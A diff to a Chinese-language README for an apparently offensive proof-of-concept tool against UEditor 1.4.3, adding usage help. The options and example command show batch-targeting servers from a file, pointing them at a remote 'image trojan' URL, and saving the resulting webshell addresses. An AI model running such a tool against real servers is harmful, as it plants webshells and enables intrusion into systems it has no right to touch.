@@ -32,5 +32,15 @@
 
 # 2. 使用
 ~~~shell
-python3.9 ueditor143Poc.py
+python3.9 ueditor143Poc.py -h
+usage: python3.9 [-h help[:options]] [[-q quiet[:options]]] [-t target_url] [-s image_shell]
+    -h  help            打印帮助信息，不能与-q同时使用
+    -q  quiet           不打印任何信息，不能与-h同时使用
+    -t  target_url      目标服务器url地址(如果不指定-f file参数，必须指定该参数)
+    -f  target_file     从文件中读取目标服务器地址
+    -m  image_shell     指定图片木马的地址(必须指定该参数)
+    -o  out_file        将webshell地址保存到指定的文件中
+
+例如：
+python3.9 ueditor143Poc.py -f target.txt -m http://x.x.x.x:xxxx/x.jpg -o shell.txt
 ~~~
